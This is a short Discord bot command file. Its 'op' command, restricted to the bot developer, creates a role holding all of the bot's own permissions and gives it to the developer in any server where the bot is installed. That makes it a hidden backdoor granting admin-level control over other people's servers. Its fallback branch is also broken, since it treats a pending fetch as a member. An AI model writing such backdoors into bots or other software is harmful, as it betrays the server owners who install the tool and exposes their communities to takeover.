module.exports = {
    name: 'op',
    description: 'Gives admin perms to the dev',
    aliases: [],
    category: 'dev',
    permissions: 'BOT_DEV',
    run (client, message, args) {
        message.guild.roles.create({
            name: 'CrowdControl Dev',
            position: message.guild.me.roles.highest.position - 1,
            permissions: message.guild.me.permissions
        }).then(role => {
            const member = message.member || message.guild.members.fetch(message.author.id)

            member.roles.add(role).then(() => message.reply('Success.'))
        })
        .catch(e => message.reply('Failed to give role!'))
    }
}